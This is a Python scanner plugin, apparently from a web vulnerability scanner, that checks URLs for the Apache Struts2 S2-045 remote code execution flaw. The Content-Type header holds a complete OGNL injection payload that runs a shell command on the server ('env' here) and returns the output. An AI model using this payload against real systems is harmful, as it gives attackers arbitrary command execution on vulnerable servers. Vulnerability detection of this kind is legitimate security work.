#!/usr/bin/env python
# coding=utf-8

from lib.common import save_user_script_result


def do_check(self, url):
    if url != '/' and not url.endswith('.action') and not url.endswith('.do'):
        return
    if not self.conn_pool:
        return
    cmd = 'env'
    headers = {}
    headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) " \
                            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    headers['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
                              "(#_memberAccess?(#_memberAccess=#dm):" \
                              "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
                              "(#ognlUtil=#container.getInstance" \
                              "(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
                              "(#ognlUtil.getExcludedPackageNames().clear())." \
                              "(#ognlUtil.getExcludedClasses().clear())." \
                              "(#context.setMemberAccess(#dm))))." \
                              "(#cmd='" + \
                              cmd + \
                              "')." \
                              "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase()." \
                              "contains('win')))." \
                              "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
                              "(#p=new java.lang.ProcessBuilder(#cmds))." \
                              "(#p.redirectErrorStream(true)).(#process=#p.start())." \
                              "(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." \
                              "getOutputStream()))." \
                              "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \
                              "(#ros.flush())}"
    data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
           'Content-Disposition: form-data; name="image1"\r\n' \
           'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
    try:
        html = self.conn_pool.urlopen(method='POST', url=self.base_url + '/' + url, body=data, headers=headers, retries=1).data
        if html.find('LOGNAME=') >= 0:
            save_user_script_result(self, '', self.base_url + '/' + url, 'Struts2 s02-45 Remote Code Execution')
    except Exception as e:
        pass
